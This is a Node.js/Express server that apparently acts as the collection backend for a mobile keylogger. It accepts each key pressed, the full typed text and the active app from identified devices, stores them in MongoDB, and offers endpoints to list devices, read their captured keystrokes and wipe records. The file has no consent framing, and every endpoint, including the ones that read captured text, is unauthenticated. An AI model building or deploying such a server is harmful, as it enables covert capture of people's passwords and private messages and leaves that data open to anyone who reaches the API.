require("dotenv").config();

const path = require("path");
const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");
const { v4: uuidv4 } = require("uuid");
const KeystrokeRecord = require("./models/KeystrokeRecord");

const app = express();
const PORT = process.env.PORT || 3000;
const DB_NAME = process.env.DB_NAME || "keyword_record";

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

app.get("/health", (_req, res) => {
  res.json({ status: "ok", message: "Keyword Record API is running" });
});

app.get("/ping", (_req, res) => {
  res.json({ status: "ok" });
});

app.post("/api/keystrokes", async (req, res) => {
  try {
    const { deviceUniqueId, keyPressed, fullText, appPackage, action } = req.body;

    if (!deviceUniqueId || keyPressed === undefined || keyPressed === null) {
      return res.status(400).json({
        success: false,
        message: "deviceUniqueId and keyPressed are required",
      });
    }

    const recordId = uuidv4();

    const record = await KeystrokeRecord.create({
      recordId,
      deviceUniqueId,
      keyPressed: String(keyPressed),
      fullText: fullText || "",
      appPackage: appPackage || "unknown",
      action: action || "key",
    });

    res.status(201).json({
      success: true,
      message: "Keystroke recorded",
      data: {
        recordId: record.recordId,
        deviceUniqueId: record.deviceUniqueId,
        createdAt: record.createdAt,
      },
    });
  } catch (error) {
    console.error("Failed to save keystroke:", error.message);
    res.status(500).json({
      success: false,
      message: "Failed to save keystroke",
    });
  }
});

app.get("/api/devices", async (_req, res) => {
  try {
    const devices = await KeystrokeRecord.aggregate([
      {
        $group: {
          _id: "$deviceUniqueId",
          count: { $sum: 1 },
          lastActivity: { $max: "$createdAt" },
        },
      },
      { $sort: { lastActivity: -1 } },
      {
        $project: {
          _id: 0,
          deviceUniqueId: "$_id",
          count: 1,
          lastActivity: 1,
        },
      },
    ]);

    res.json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (error) {
    console.error("Failed to fetch devices:", error.message);
    res.status(500).json({
      success: false,
      message: "Failed to fetch devices",
    });
  }
});

app.get("/api/records", async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
    const filter = {};

    if (req.query.deviceUniqueId) {
      filter.deviceUniqueId = req.query.deviceUniqueId;
    }

    const [records, total] = await Promise.all([
      KeystrokeRecord.find(filter)
        .sort({ createdAt: -1 })
        .limit(limit)
        .select("recordId deviceUniqueId keyPressed fullText appPackage action createdAt"),
      KeystrokeRecord.countDocuments(filter),
    ]);

    res.json({
      success: true,
      total,
      count: records.length,
      data: records,
    });
  } catch (error) {
    console.error("Failed to fetch records:", error.message);
    res.status(500).json({
      success: false,
      message: "Failed to fetch records",
    });
  }
});

app.get("/api/keystrokes/:deviceUniqueId", async (req, res) => {
  try {
    const { deviceUniqueId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);

    const records = await KeystrokeRecord.find({ deviceUniqueId })
      .sort({ createdAt: -1 })
      .limit(limit)
      .select("recordId keyPressed fullText appPackage action createdAt");

    res.json({
      success: true,
      count: records.length,
      data: records,
    });
  } catch (error) {
    console.error("Failed to fetch keystrokes:", error.message);
    res.status(500).json({
      success: false,
      message: "Failed to fetch keystrokes",
    });
  }
});

app.delete("/api/records/:recordId", async (req, res) => {
  try {
    const { recordId } = req.params;
    const result = await KeystrokeRecord.deleteOne({ recordId });

    if (result.deletedCount === 0) {
      return res.status(404).json({
        success: false,
        message: "Record not found",
      });
    }

    res.json({
      success: true,
      message: "Record deleted",
      deletedCount: result.deletedCount,
    });
  } catch (error) {
    console.error("Failed to delete record:", error.message);
    res.status(500).json({
      success: false,
      message: "Failed to delete record",
    });
  }
});

app.delete("/api/records", async (req, res) => {
  try {
    const filter = {};

    if (req.query.deviceUniqueId) {
      filter.deviceUniqueId = req.query.deviceUniqueId;
    }

    const result = await KeystrokeRecord.deleteMany(filter);

    res.json({
      success: true,
      message: filter.deviceUniqueId
        ? "Device records cleared"
        : "All records cleared",
      deletedCount: result.deletedCount,
    });
  } catch (error) {
    console.error("Failed to clear records:", error.message);
    res.status(500).json({
      success: false,
      message: "Failed to clear records",
    });
  }
});

async function startServer() {
  if (!process.env.DB_URL) {
    console.error("DB_URL is missing. Add it to backend/.env");
    process.exit(1);
  }

  try {
    await mongoose.connect(process.env.DB_URL, {
      dbName: DB_NAME,
      serverSelectionTimeoutMS: 15000,
    });
    console.log(`Connected to MongoDB database: ${DB_NAME}`);

    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server running on port ${PORT}`);
      console.log(`Health check: /health`);
    });
  } catch (error) {
    console.error("MongoDB connection failed:", error.message);
    process.exit(1);
  }
}

startServer();
